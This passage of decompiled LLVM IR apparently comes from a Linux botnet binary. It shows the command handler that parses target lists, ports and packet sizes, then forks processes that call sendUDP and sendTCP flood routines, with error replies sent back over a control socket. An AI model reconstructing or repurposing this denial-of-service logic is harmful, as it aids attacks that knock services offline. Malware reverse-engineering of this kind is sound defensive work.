  %v2_804f418 = icmp ugt i32* %arg2, inttoptr (i32 -17 to i32*)
  store i1 %v2_804f418, i1* %cf.global-to-local, align 1
  %v1_804f41b = inttoptr i32 %v1_804f418 to i32*
  %v2_804f41b = load i32, i32* %v1_804f41b, align 4
  %v1_804f420 = call i32 @atol(i32 %v2_804f41b)
  %v5_804f425 = icmp ne i32 %v1_804f420, -1
  store i1 %v5_804f425, i1* %cf.global-to-local, align 1
  %v10_804f425 = icmp eq i32 %v1_804f420, -1
  br i1 %v10_804f425, label %dec_label_pc_804f49c, label %dec_label_pc_804f42a

dec_label_pc_804f42a:                             ; preds = %dec_label_pc_804f415
  %v1_804f42d = add i32 %tmp141, 20
  %v5_804f42d = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_804f42d, i1* %cf.global-to-local, align 1
  %v1_804f430 = inttoptr i32 %v1_804f42d to i32*
  %v2_804f430 = load i32, i32* %v1_804f430, align 4
  %v1_804f435 = call i32 @atol(i32 %v2_804f430)
  %v5_804f43a = icmp ne i32 %v1_804f435, -1
  store i1 %v5_804f43a, i1* %cf.global-to-local, align 1
  %v10_804f43a = icmp eq i32 %v1_804f435, -1
  br i1 %v10_804f43a, label %dec_label_pc_804f49c, label %dec_label_pc_804f43f

dec_label_pc_804f43f:                             ; preds = %dec_label_pc_804f42a
  store i1 %v5_804f42d, i1* %cf.global-to-local, align 1
  %v2_804f445 = load i32, i32* %v1_804f430, align 4
  %v1_804f44a = call i32 @atol(i32 %v2_804f445)
  %v1_804f44f = add i32 %v1_804f44a, -65536
  %v2_804f44f = icmp ult i32 %v1_804f44a, 65536
  %v3_804f44f = sub i32 65535, %v1_804f44a
  %v4_804f44f = and i32 %v3_804f44f, %v1_804f44a
  %v5_804f44f = icmp slt i32 %v4_804f44f, 0
  store i1 %v2_804f44f, i1* %cf.global-to-local, align 1
  %v6_804f44f = icmp eq i32 %v1_804f44f, 0
  %v7_804f44f = icmp slt i32 %v1_804f44f, 0
  %v3_804f454 = icmp eq i1 %v7_804f44f, %v5_804f44f
  %v4_804f454 = icmp eq i1 %v6_804f44f, false
  %v5_804f454 = and i1 %v4_804f454, %v3_804f454
  br i1 %v5_804f454, label %dec_label_pc_804f49c, label %dec_label_pc_804f456

dec_label_pc_804f456:                             ; preds = %dec_label_pc_804f43f
  store i1 %v5_804f42d, i1* %cf.global-to-local, align 1
  %v2_804f45c = load i32, i32* %v1_804f430, align 4
  %v1_804f461 = call i32 @atol(i32 %v2_804f45c)
  %v1_804f466 = add i32 %v1_804f461, -65500
  %v5_804f466 = icmp ult i32 %v1_804f461, 65500
  %v6_804f466 = sub i32 65499, %v1_804f461
  %v7_804f466 = and i32 %v6_804f466, %v1_804f461
  %v8_804f466 = icmp slt i32 %v7_804f466, 0
  store i1 %v5_804f466, i1* %cf.global-to-local, align 1
  %v9_804f466 = icmp eq i32 %v1_804f466, 0
  %v10_804f466 = icmp slt i32 %v1_804f466, 0
  %v3_804f46b = icmp eq i1 %v10_804f466, %v8_804f466
  %v4_804f46b = icmp eq i1 %v9_804f466, false
  %v5_804f46b = and i1 %v4_804f46b, %v3_804f46b
  br i1 %v5_804f46b, label %dec_label_pc_804f49c, label %dec_label_pc_804f46d

dec_label_pc_804f46d:                             ; preds = %dec_label_pc_804f456
  store i1 %v2_804f418, i1* %cf.global-to-local, align 1
  %v2_804f473 = load i32, i32* %v1_804f41b, align 4
  %v1_804f478 = call i32 @atol(i32 %v2_804f473)
  %v1_804f47d = add i32 %v1_804f478, -32
  %v2_804f47d = icmp ult i32 %v1_804f478, 32
  %v3_804f47d = sub i32 31, %v1_804f478
  %v4_804f47d = and i32 %v3_804f47d, %v1_804f478
  %v5_804f47d = icmp slt i32 %v4_804f47d, 0
  store i1 %v2_804f47d, i1* %cf.global-to-local, align 1
  %v6_804f47d = icmp eq i32 %v1_804f47d, 0
  %v7_804f47d = icmp slt i32 %v1_804f47d, 0
  %v3_804f480 = icmp eq i1 %v7_804f47d, %v5_804f47d
  %v4_804f480 = icmp eq i1 %v6_804f47d, false
  %v5_804f480 = and i1 %v4_804f480, %v3_804f480
  br i1 %v5_804f480, label %dec_label_pc_804f49c, label %dec_label_pc_804f482

dec_label_pc_804f482:                             ; preds = %dec_label_pc_804f46d
  %v8_804f482 = icmp ult i32 %arg1, 7
  store i1 %v8_804f482, i1* %cf.global-to-local, align 1
  %v12_804f482 = icmp eq i32 %arg1, 7
  %v1_804f486 = icmp eq i1 %v12_804f482, false
  br i1 %v1_804f486, label %dec_label_pc_804f4b6, label %dec_label_pc_804f488

dec_label_pc_804f488:                             ; preds = %dec_label_pc_804f482
  %v1_804f48b = add i32 %tmp141, 24
  %v5_804f48b = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804f48b, i1* %cf.global-to-local, align 1
  %v1_804f48e = inttoptr i32 %v1_804f48b to i32*
  %v2_804f48e = load i32, i32* %v1_804f48e, align 4
  %v1_804f493 = call i32 @atol(i32 %v2_804f48e)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp148 = icmp slt i32 %v1_804f493, 1
  %tmp149 = icmp eq i1 %tmp148, false
  br i1 %tmp149, label %dec_label_pc_804f4b6, label %dec_label_pc_804f49c

dec_label_pc_804f49c:                             ; preds = %dec_label_pc_804f3d9, %dec_label_pc_804f488, %dec_label_pc_804f46d, %dec_label_pc_804f456, %dec_label_pc_804f43f, %dec_label_pc_804f42a, %dec_label_pc_804f415, %dec_label_pc_804f3fc, %dec_label_pc_804f3e3
  %v0_804f49c = load i32, i32* @global_var_805b540.20, align 64
  %v2_804f4ac = call i32 @sockprintf(i32 %v0_804f49c, i32 ptrtoint ([113 x i8]* @global_var_8059480.424 to i32))
  br label %dec_label_pc_804fe04

dec_label_pc_804f4b6:                             ; preds = %dec_label_pc_804f488, %dec_label_pc_804f482
  %v1_804f4b9 = add i32 %tmp141, 4
  %v1_804f4bc = inttoptr i32 %v1_804f4b9 to i32*
  %v2_804f4bc = load i32, i32* %v1_804f4bc, align 4
  store i1 %v5_804f3ff, i1* %cf.global-to-local, align 1
  %v2_804f4c7 = load i32, i32* %v1_804f402, align 4
  %v1_804f4cc = call i32 @atol(i32 %v2_804f4c7)
  store i1 %v5_804f3e6, i1* %cf.global-to-local, align 1
  %v2_804f4da = load i32, i32* %v1_804f3e9, align 4
  %v1_804f4df = call i32 @atol(i32 %v2_804f4da)
  store i1 %v2_804f418, i1* %cf.global-to-local, align 1
  %v2_804f4ed = load i32, i32* %v1_804f41b, align 4
  %v1_804f4f2 = call i32 @atol(i32 %v2_804f4ed)
  store i1 %v5_804f42d, i1* %cf.global-to-local, align 1
  %v2_804f500 = load i32, i32* %v1_804f430, align 4
  %v1_804f505 = call i32 @atol(i32 %v2_804f500)
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f511 = icmp sgt i32 %arg1, 6
  br i1 %v7_804f511, label %dec_label_pc_804f535, label %dec_label_pc_804f535.thread

dec_label_pc_804f535.thread:                      ; preds = %dec_label_pc_804f4b6
  store i32 1000, i32* @esi, align 4
  store i1 %v8_804f482, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f566

dec_label_pc_804f535:                             ; preds = %dec_label_pc_804f4b6
  %v1_804f516 = add i32 %tmp141, 24
  %v5_804f516 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804f516, i1* %cf.global-to-local, align 1
  %v1_804f519 = inttoptr i32 %v1_804f516 to i32*
  %v2_804f519 = load i32, i32* %v1_804f519, align 4
  %v1_804f51e = call i32 @atol(i32 %v2_804f519)
  store i32 %v1_804f51e, i32* @esi, align 4
  store i1 %v8_804f482, i1* %cf.global-to-local, align 1
  %v7_804f542 = icmp eq i32 %arg1, 7
  br i1 %v7_804f542, label %dec_label_pc_804f566, label %dec_label_pc_804f544

dec_label_pc_804f544:                             ; preds = %dec_label_pc_804f535
  %v1_804f547 = add i32 %tmp141, 28
  %v5_804f547 = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_804f547, i1* %cf.global-to-local, align 1
  %v1_804f54a = inttoptr i32 %v1_804f547 to i32*
  %v2_804f54a = load i32, i32* %v1_804f54a, align 4
  %v1_804f54f = call i32 @atol(i32 %v2_804f54a)
  br label %dec_label_pc_804f566

dec_label_pc_804f566:                             ; preds = %dec_label_pc_804f535, %dec_label_pc_804f535.thread, %dec_label_pc_804f544
  %storemerge9157 = phi i32 [ %v1_804f51e, %dec_label_pc_804f544 ], [ %v1_804f51e, %dec_label_pc_804f535 ], [ 1000, %dec_label_pc_804f535.thread ]
  %storemerge8 = phi i32 [ %v1_804f54f, %dec_label_pc_804f544 ], [ 1000000, %dec_label_pc_804f535 ], [ 1000000, %dec_label_pc_804f535.thread ]
  store i32 %storemerge8, i32* @edi, align 4
  %v9_804f56f = icmp ult i32 %arg1, 8
  store i1 %v9_804f56f, i1* %cf.global-to-local, align 1
  %v7_804f573 = icmp sgt i32 %arg1, 8
  br i1 %v7_804f573, label %dec_label_pc_804f575, label %dec_label_pc_804f597

dec_label_pc_804f575:                             ; preds = %dec_label_pc_804f566
  %v1_804f578 = add i32 %tmp141, 32
  %v2_804f578 = icmp ugt i32* %arg2, inttoptr (i32 -33 to i32*)
  store i1 %v2_804f578, i1* %cf.global-to-local, align 1
  %v1_804f57b = inttoptr i32 %v1_804f578 to i32*
  %v2_804f57b = load i32, i32* %v1_804f57b, align 4
  %v1_804f580 = call i32 @atol(i32 %v2_804f57b)
  %phitmp = sext i32 %v1_804f580 to i64
  br label %dec_label_pc_804f597

dec_label_pc_804f597:                             ; preds = %dec_label_pc_804f566, %dec_label_pc_804f575
  %storemerge7 = phi i64 [ %phitmp, %dec_label_pc_804f575 ], [ 0, %dec_label_pc_804f566 ]
  %v2_804f5ae = inttoptr i32 %v2_804f4bc to i8*
  %v3_804f5ae = call i32 @__GI_strchr(i8* %v2_804f5ae, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f5b3 = icmp eq i32 %v3_804f5ae, 0
  br i1 %v1_804f5b3, label %dec_label_pc_804f646, label %dec_label_pc_804f5bb

dec_label_pc_804f5bb:                             ; preds = %dec_label_pc_804f597
  store i32 %v2_804f4bc, i32* @eax, align 4
  %v2_804f5c9 = call i32 @__GI_strtok(i32 %v2_804f4bc, i32 ptrtoint (i32* @global_var_8059131.303 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f63b43 = icmp eq i32 %v2_804f5c9, 0
  %v1_804f63f50 = icmp eq i1 %v4_804f63b43, false
  br i1 %v1_804f63f50, label %dec_label_pc_804f5d3, label %dec_label_pc_804fe04

dec_label_pc_804f5d3:                             ; preds = %dec_label_pc_804f5bb, %dec_label_pc_804f624
  %storemerge1051 = phi i32 [ %v2_804f633, %dec_label_pc_804f624 ], [ %v2_804f5c9, %dec_label_pc_804f5bb ]
  %v0_804f5d3 = call i32 @listFork()
  store i32 %v0_804f5d3, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f5d8 = icmp eq i32 %v0_804f5d3, 0
  %v1_804f5da = icmp eq i1 %v1_804f5d8, false
  br i1 %v1_804f5da, label %dec_label_pc_804f624, label %dec_label_pc_804f5dc

dec_label_pc_804f5dc:                             ; preds = %dec_label_pc_804f5d3
  %v9_804f613 = call i32 @sendUDP(i32 %storemerge1051, i32 %v1_804f4cc, i32 %v1_804f4df, i32 %v1_804f4f2, i32 %v1_804f505, i32 %storemerge9157, i32 %storemerge8, i64 %storemerge7)
  %v1_804f61f = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f624:                             ; preds = %dec_label_pc_804f5d3
  %v2_804f633 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8059131.303 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f63b = icmp eq i32 %v2_804f633, 0
  %v1_804f63f = icmp eq i1 %v4_804f63b, false
  br i1 %v1_804f63f, label %dec_label_pc_804f5d3, label %dec_label_pc_804fe04

dec_label_pc_804f646:                             ; preds = %dec_label_pc_804f597
  %v0_804f646 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f64b = icmp eq i32 %v0_804f646, 0
  %v1_804f64d = icmp eq i1 %v1_804f64b, false
  br i1 %v1_804f64d, label %dec_label_pc_804fe04, label %dec_label_pc_804f653

dec_label_pc_804f653:                             ; preds = %dec_label_pc_804f646
  %v9_804f68a = call i32 @sendUDP(i32 %v2_804f4bc, i32 %v1_804f4cc, i32 %v1_804f4df, i32 %v1_804f4f2, i32 %v1_804f505, i32 %storemerge9157, i32 %storemerge8, i64 %storemerge7)
  %v1_804f696 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f69b:                             ; preds = %dec_label_pc_804f38e
  %v2_804f69e = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804f6bb = inttoptr i32 %v2_804f69e to i8*
  store i32 %v2_804f69e, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80594f1.425 to i32), i32* @edi, align 4
  %v7_804f6cd = call i32 @_strncmp(i8* %v4_804f6bb, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80594f1.425, i32 0, i32 0), i32 4)
  %v8_804f6cd = urem i32 %v7_804f6cd, 2
  %v9_804f6cd = icmp eq i32 %v8_804f6cd, 0
  %v0_804f6cf = load i1, i1* %cf.global-to-local, align 1
  %v2_804f6cf = or i1 %v0_804f6cf, %v9_804f6cd
  %v3_804f6cf = zext i1 %v2_804f6cf to i32
  %v4_804f6cf = load i32, i32* %edx.global-to-local, align 4
  %v5_804f6cf = and i32 %v4_804f6cf, -256
  %v6_804f6cf = or i32 %v3_804f6cf, %v5_804f6cf
  %v7_804f6cf = xor i32 %v6_804f6cf, 1
  store i32 %v7_804f6cf, i32* @edx, align 4
  %v1_804f6d7 = trunc i32 %v7_804f6cf to i8
  %v3_804f6d7 = zext i1 %v0_804f6cf to i8
  %v15_804f6d7 = icmp eq i8 %v1_804f6d7, %v3_804f6d7
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f6e0 = icmp eq i1 %v15_804f6d7, false
  br i1 %v1_804f6e0, label %dec_label_pc_804f929, label %dec_label_pc_804f6e6

dec_label_pc_804f6e6:                             ; preds = %dec_label_pc_804f69b
  %v9_804f6e6 = icmp ult i32 %arg1, 5
  store i1 %v9_804f6e6, i1* %cf.global-to-local, align 1
  %v7_804f6ea = icmp sgt i32 %arg1, 5
  br i1 %v7_804f6ea, label %dec_label_pc_804f6f0, label %dec_label_pc_804f778

dec_label_pc_804f6f0:                             ; preds = %dec_label_pc_804f6e6
  %v1_804f6f3 = add i32 %tmp141, 12
  %v5_804f6f3 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804f6f3, i1* %cf.global-to-local, align 1
  %v1_804f6f6 = inttoptr i32 %v1_804f6f3 to i32*
  %v2_804f6f6 = load i32, i32* %v1_804f6f6, align 4
  %v1_804f6fb = call i32 @atol(i32 %v2_804f6f6)
  %v5_804f700 = icmp ne i32 %v1_804f6fb, -1
  store i1 %v5_804f700, i1* %cf.global-to-local, align 1
  %v10_804f700 = icmp eq i32 %v1_804f6fb, -1
  br i1 %v10_804f700, label %dec_label_pc_804f778, label %dec_label_pc_804f705

dec_label_pc_804f705:                             ; preds = %dec_label_pc_804f6f0
  %v1_804f708 = add i32 %tmp141, 8
  %v5_804f708 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804f708, i1* %cf.global-to-local, align 1
  %v1_804f70b = inttoptr i32 %v1_804f708 to i32*
  %v2_804f70b = load i32, i32* %v1_804f70b, align 4
  %v1_804f710 = call i32 @atol(i32 %v2_804f70b)
  %v5_804f715 = icmp ne i32 %v1_804f710, -1
  store i1 %v5_804f715, i1* %cf.global-to-local, align 1
  %v10_804f715 = icmp eq i32 %v1_804f710, -1
  br i1 %v10_804f715, label %dec_label_pc_804f778, label %dec_label_pc_804f71a

dec_label_pc_804f71a:                             ; preds = %dec_label_pc_804f705
  %v1_804f71d = add i32 %tmp141, 16
  %v2_804f71d = icmp ugt i32* %arg2, inttoptr (i32 -17 to i32*)
  store i1 %v2_804f71d, i1* %cf.global-to-local, align 1
  %v1_804f720 = inttoptr i32 %v1_804f71d to i32*
  %v2_804f720 = load i32, i32* %v1_804f720, align 4
  %v1_804f725 = call i32 @atol(i32 %v2_804f720)
  %v5_804f72a = icmp ne i32 %v1_804f725, -1
  store i1 %v5_804f72a, i1* %cf.global-to-local, align 1
  %v10_804f72a = icmp eq i32 %v1_804f725, -1
  br i1 %v10_804f72a, label %dec_label_pc_804f778, label %dec_label_pc_804f72f

dec_label_pc_804f72f:                             ; preds = %dec_label_pc_804f71a
  store i1 %v2_804f71d, i1* %cf.global-to-local, align 1
  %v2_804f735 = load i32, i32* %v1_804f720, align 4
  %v1_804f73a = call i32 @atol(i32 %v2_804f735)
  %v1_804f73f = add i32 %v1_804f73a, -32
  %v2_804f73f = icmp ult i32 %v1_804f73a, 32
  %v3_804f73f = sub i32 31, %v1_804f73a
  %v4_804f73f = and i32 %v3_804f73f, %v1_804f73a
  %v5_804f73f = icmp slt i32 %v4_804f73f, 0
  store i1 %v2_804f73f, i1* %cf.global-to-local, align 1
  %v6_804f73f = icmp eq i32 %v1_804f73f, 0
  %v7_804f73f = icmp slt i32 %v1_804f73f, 0
  %v3_804f742 = icmp eq i1 %v7_804f73f, %v5_804f73f
  %v4_804f742 = icmp eq i1 %v6_804f73f, false
  %v5_804f742 = and i1 %v4_804f742, %v3_804f742
  br i1 %v5_804f742, label %dec_label_pc_804f778, label %dec_label_pc_804f744

dec_label_pc_804f744:                             ; preds = %dec_label_pc_804f72f
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f748 = icmp sgt i32 %arg1, 6
  br i1 %v7_804f748, label %dec_label_pc_804f74a, label %dec_label_pc_804f75e

dec_label_pc_804f74a:                             ; preds = %dec_label_pc_804f744
  %v1_804f74d = add i32 %tmp141, 24
  %v5_804f74d = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804f74d, i1* %cf.global-to-local, align 1
  %v1_804f750 = inttoptr i32 %v1_804f74d to i32*
  %v2_804f750 = load i32, i32* %v1_804f750, align 4
  %v1_804f755 = call i32 @atol(i32 %v2_804f750)
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804f75a = icmp slt i32 %v1_804f755, 0
  br i1 %v2_804f75a, label %dec_label_pc_804f778, label %dec_label_pc_804f75e

dec_label_pc_804f75e:                             ; preds = %dec_label_pc_804f744, %dec_label_pc_804f74a
  %v8_804f75e = icmp ult i32 %arg1, 8
  store i1 %v8_804f75e, i1* %cf.global-to-local, align 1
  %v12_804f75e = icmp eq i32 %arg1, 8
  %v1_804f762 = icmp eq i1 %v12_804f75e, false
  br i1 %v1_804f762, label %dec_label_pc_804f792, label %dec_label_pc_804f764

dec_label_pc_804f764:                             ; preds = %dec_label_pc_804f75e
  %v1_804f767 = add i32 %tmp141, 28
  %v5_804f767 = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_804f767, i1* %cf.global-to-local, align 1
  %v1_804f76a = inttoptr i32 %v1_804f767 to i32*
  %v2_804f76a = load i32, i32* %v1_804f76a, align 4
  %v1_804f76f = call i32 @atol(i32 %v2_804f76a)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp150 = icmp slt i32 %v1_804f76f, 1
  %tmp151 = icmp eq i1 %tmp150, false
  br i1 %tmp151, label %dec_label_pc_804f792, label %dec_label_pc_804f778

dec_label_pc_804f778:                             ; preds = %dec_label_pc_804f6e6, %dec_label_pc_804f764, %dec_label_pc_804f74a, %dec_label_pc_804f72f, %dec_label_pc_804f71a, %dec_label_pc_804f705, %dec_label_pc_804f6f0
  %v0_804f778 = load i32, i32* @global_var_805b540.20, align 64
  %v2_804f788 = call i32 @sockprintf(i32 %v0_804f778, i32 ptrtoint ([186 x i8]* @global_var_80594f8.426 to i32))
  br label %dec_label_pc_804fe04

dec_label_pc_804f792:                             ; preds = %dec_label_pc_804f764, %dec_label_pc_804f75e
  %v1_804f795 = add i32 %tmp141, 4
  %v1_804f798 = inttoptr i32 %v1_804f795 to i32*
  %v2_804f798 = load i32, i32* %v1_804f798, align 4
  store i1 %v5_804f708, i1* %cf.global-to-local, align 1
  %v2_804f7a3 = load i32, i32* %v1_804f70b, align 4
  %v1_804f7a8 = call i32 @atol(i32 %v2_804f7a3)
  store i1 %v5_804f6f3, i1* %cf.global-to-local, align 1
  %v2_804f7b6 = load i32, i32* %v1_804f6f6, align 4
  %v1_804f7bb = call i32 @atol(i32 %v2_804f7b6)
  store i1 %v2_804f71d, i1* %cf.global-to-local, align 1
  %v2_804f7c9 = load i32, i32* %v1_804f720, align 4
  %v1_804f7ce = call i32 @atol(i32 %v2_804f7c9)
  %v1_804f7d9 = add i32 %tmp141, 20
  %v1_804f7dc = inttoptr i32 %v1_804f7d9 to i32*
  %v2_804f7dc = load i32, i32* %v1_804f7dc, align 4
  store i1 %v8_804f75e, i1* %cf.global-to-local, align 1
  br i1 %v1_804f762, label %dec_label_pc_804f809, label %dec_label_pc_804f7e7

dec_label_pc_804f7e7:                             ; preds = %dec_label_pc_804f792
  %v1_804f7ea = add i32 %tmp141, 28
  %v5_804f7ea = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_804f7ea, i1* %cf.global-to-local, align 1
  %v1_804f7ed = inttoptr i32 %v1_804f7ea to i32*
  %v2_804f7ed = load i32, i32* %v1_804f7ed, align 4
  %v1_804f7f2 = call i32 @atol(i32 %v2_804f7ed)
  br label %dec_label_pc_804f809

dec_label_pc_804f809:                             ; preds = %dec_label_pc_804f792, %dec_label_pc_804f7e7
  %storemerge6 = phi i32 [ %v1_804f7f2, %dec_label_pc_804f7e7 ], [ 10, %dec_label_pc_804f792 ]
  store i32 %storemerge6, i32* @esi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v7_804f748, label %dec_label_pc_804f818, label %dec_label_pc_804f83a

dec_label_pc_804f818:                             ; preds = %dec_label_pc_804f809
  %v1_804f81b = add i32 %tmp141, 24
  %v5_804f81b = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804f81b, i1* %cf.global-to-local, align 1
  %v1_804f81e = inttoptr i32 %v1_804f81b to i32*
  %v2_804f81e = load i32, i32* %v1_804f81e, align 4
  %v1_804f823 = call i32 @atol(i32 %v2_804f81e)
  br label %dec_label_pc_804f83a

dec_label_pc_804f83a:                             ; preds = %dec_label_pc_804f809, %dec_label_pc_804f818
  %storemerge5 = phi i32 [ %v1_804f823, %dec_label_pc_804f818 ], [ 0, %dec_label_pc_804f809 ]
  store i32 %storemerge5, i32* @edi, align 4
  %v2_804f851 = inttoptr i32 %v2_804f798 to i8*
  %v3_804f851 = call i32 @__GI_strchr(i8* %v2_804f851, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f856 = icmp eq i32 %v3_804f851, 0
  br i1 %v1_804f856, label %dec_label_pc_804f8df, label %dec_label_pc_804f85e

dec_label_pc_804f85e:                             ; preds = %dec_label_pc_804f83a
  store i32 %v2_804f798, i32* @eax, align 4
  %v2_804f86c = call i32 @__GI_strtok(i32 %v2_804f798, i32 ptrtoint (i32* @global_var_8059131.303 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f8d734 = icmp eq i32 %v2_804f86c, 0
  %v1_804f8db41 = icmp eq i1 %v4_804f8d734, false
  br i1 %v1_804f8db41, label %dec_label_pc_804f876, label %dec_label_pc_804f929

dec_label_pc_804f876:                             ; preds = %dec_label_pc_804f85e, %dec_label_pc_804f8c0
  %storemerge1142 = phi i32 [ %v2_804f8cf, %dec_label_pc_804f8c0 ], [ %v2_804f86c, %dec_label_pc_804f85e ]
  %v0_804f876 = call i32 @listFork()
  store i32 %v0_804f876, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f87b = icmp eq i32 %v0_804f876, 0
  %v1_804f87d = icmp eq i1 %v1_804f87b, false
  br i1 %v1_804f87d, label %dec_label_pc_804f8c0, label %dec_label_pc_804f87f

dec_label_pc_804f87f:                             ; preds = %dec_label_pc_804f876
  %v7_804f8af = inttoptr i32 %v2_804f7dc to i8*
  %v8_804f8af = call i32 @sendTCP(i32 %storemerge1142, i32 %v1_804f7a8, i32 %v1_804f7bb, i32 %v1_804f7ce, i8* %v7_804f8af, i32 %storemerge5, i32 %storemerge6)
  %v1_804f8bb = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f8c0:                             ; preds = %dec_label_pc_804f876
  %v2_804f8cf = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8059131.303 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f8d7 = icmp eq i32 %v2_804f8cf, 0
  %v1_804f8db = icmp eq i1 %v4_804f8d7, false
  br i1 %v1_804f8db, label %dec_label_pc_804f876, label %dec_label_pc_804f929

dec_label_pc_804f8df:                             ; preds = %dec_label_pc_804f83a
  %v0_804f8df = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f8e4 = icmp eq i32 %v0_804f8df, 0
  %v1_804f8e6 = icmp eq i1 %v1_804f8e4, false
  br i1 %v1_804f8e6, label %dec_label_pc_804f929, label %dec_label_pc_804f8e8

dec_label_pc_804f8e8:                             ; preds = %dec_label_pc_804f8df
  %v7_804f918 = inttoptr i32 %v2_804f7dc to i8*
  %v8_804f918 = call i32 @sendTCP(i32 %v2_804f798, i32 %v1_804f7a8, i32 %v1_804f7bb, i32 %v1_804f7ce, i8* %v7_804f918, i32 %storemerge5, i32 %storemerge6)
  %v1_804f924 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f929:                             ; preds = %dec_label_pc_804f8c0, %dec_label_pc_804f85e, %dec_label_pc_804f8df, %dec_label_pc_804f69b
  %v2_804f92c = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804f949 = inttoptr i32 %v2_804f92c to i8*
  store i32 %v2_804f92c, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80595b2.427 to i32), i32* @edi, align 4
  %v7_804f95b = call i32 @_strncmp(i8* %v4_804f949, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80595b2.427, i32 0, i32 0), i32 5)
  %v8_804f95b = urem i32 %v7_804f95b, 2
  %v9_804f95b = icmp eq i32 %v8_804f95b, 0
  %v0_804f95d = load i1, i1* %cf.global-to-local, align 1
  %v2_804f95d = or i1 %v0_804f95d, %v9_804f95b
  %v3_804f95d = zext i1 %v2_804f95d to i32
  %v4_804f95d = load i32, i32* @edx, align 4
  %v5_804f95d = and i32 %v4_804f95d, -256
  %v6_804f95d = or i32 %v3_804f95d, %v5_804f95d
  %v7_804f95d = xor i32 %v6_804f95d, 1
  store i32 %v7_804f95d, i32* @edx, align 4
  %v3_804f963 = and i32 %v7_804f95b, -256
  %v1_804f965 = trunc i32 %v7_804f95d to i8
  %v3_804f965 = zext i1 %v0_804f95d to i8
  %v4_804f965 = sub nsw i8 %v1_804f965, %v3_804f965
  %v15_804f965 = icmp eq i8 %v4_804f965, 0
  %v20_804f965 = zext i8 %v4_804f965 to i32
  %v23_804f965 = or i32 %v20_804f965, %v3_804f963
  store i32 %v23_804f965, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f96e = icmp eq i1 %v15_804f965, false
  br i1 %v1_804f96e, label %dec_label_pc_804faf4, label %dec_label_pc_804f974

dec_label_pc_804f974:                             ; preds = %dec_label_pc_804f929
  %v2_804f969 = sext i8 %v4_804f965 to i32
  %v9_804f974 = icmp ult i32 %arg1, 5
  store i1 %v9_804f974, i1* %cf.global-to-local, align 1
  %v7_804f978 = icmp sgt i32 %arg1, 5
  br i1 %v7_804f978, label %dec_label_pc_804f97e, label %dec_label_pc_804fe04

dec_label_pc_804f97e:                             ; preds = %dec_label_pc_804f974
  %v1_804f981 = add i32 %tmp141, 4
  %v5_804f981 = icmp ugt i32* %arg2, inttoptr (i32 -5 to i32*)
  store i1 %v5_804f981, i1* %cf.global-to-local, align 1
  %v1_804f984 = inttoptr i32 %v1_804f981 to i32*
  %v2_804f984 = load i32, i32* %v1_804f984, align 4
  %v2_804f991 = inttoptr i32 %v2_804f984 to i8*
  %v3_804f991 = call i32 @__GI_strchr(i8* %v2_804f991, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f996 = icmp eq i32 %v3_804f991, 0
  br i1 %v1_804f996, label %dec_label_pc_804fa6a, label %dec_label_pc_804f99e

dec_label_pc_804f99e:                             ; preds = %dec_label_pc_804f97e
  store i1 %v5_804f981, i1* %cf.global-to-local, align 1
  %v2_804f9a4 = load i32, i32* %v1_804f984, align 4
  store i32 %v2_804f9a4, i32* @eax, align 4
  %v2_804f9b1 = call i32 @__GI_strtok(i32 %v2_804f9a4, i32 ptrtoint (i32* @global_var_8059131.303 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fa5b26 = icmp eq i32 %v2_804f9b1, 0
  %v1_804fa5f33 = icmp eq i1 %v4_804fa5b26, false
  br i1 %v1_804fa5f33, label %dec_label_pc_804f9be, label %dec_label_pc_804faf4

dec_label_pc_804f9be:                             ; preds = %dec_label_pc_804f99e, %dec_label_pc_804fa44
  %v0_804f9be = call i32 @listFork()
  store i32 %v0_804f9be, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
